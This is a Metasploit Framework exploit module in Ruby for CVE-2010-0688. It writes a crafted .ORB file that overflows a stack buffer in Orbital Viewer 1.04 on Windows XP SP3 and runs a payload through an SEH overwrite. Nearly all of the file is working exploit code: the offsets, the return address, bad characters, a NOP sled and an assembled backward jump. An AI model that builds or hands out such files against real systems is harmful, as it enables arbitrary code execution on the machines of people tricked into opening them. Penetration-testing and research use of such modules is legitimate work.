##
# $Id: orbital_viewer_orb.rb 8754 2010-03-09 01:04:44Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Orbital Viewer ORB File Parsing Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in David Manthey's
				Orbital Viewer. When processing .ORB files, data is read from file into
				a fixed-size stack buffer using the fscanf function. Since no bounds
				checking is done, a buffer overflow can occur. Attackers can execute 
				arbitrary code by convincing their victim to open an ORB file.
			},
			'License'        => MSF_LICENSE,
			'Author' 	     => [ 'jduck' ],
			'Version'        => '$Revision: 8754 $',
			'References'     =>
				[
					[ 'BID', '38436' ],
					[ 'OSVDB', '62580' ],
					[ 'CVE', '2010-0688' ],
					[ 'URL', 'http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-011-orbital-viewer-orb-buffer-overflow/' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/11581' ]
				],
			'Payload'        =>
				{
					'Space'       => 2048,
					'BadChars'    => "\x00\x09\x0a\x0d\x20", # \xbd was safe in my test, \x09 was not
					'DisableNops' => true,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Orbital Viewer 1.04 on Windows XP SP3',
						{
							'Ret' => 0x004032a2, # p/p/r in ov.exe v1.0.0.2
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Feb 27 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.orb']),
			], self.class)
	end

	def exploit

		seh_offset = 3968

		sploit = "OrbitalFileV1.0\r\n"
		
		line2 = ''
		nop_count = seh_offset - payload.encoded.length
		line2 << make_nops(nop_count)
		line2 << payload.encoded
		line2 << generate_seh_record(target.ret)
		distance = seh_offset + 8
		line2 << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
		line2 << rand_text_alphanumeric(1024) * 20

		sploit << line2

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end
